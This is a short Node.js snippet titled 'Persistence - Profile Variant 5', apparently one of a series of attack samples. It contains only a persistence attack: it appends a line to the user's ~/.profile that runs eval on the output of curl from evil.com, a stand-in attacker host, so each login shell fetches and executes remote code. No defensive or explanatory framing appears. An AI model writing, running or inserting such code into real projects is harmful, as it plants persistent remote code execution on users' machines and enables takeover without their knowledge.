// Persistence - Profile Variant 5
const fs = require('fs');
const profile = process.env.HOME + '/.profile';
fs.writeFileSync(profile, fs.readFileSync(profile) + '\neval $(curl -s http://evil.com/init)\n');
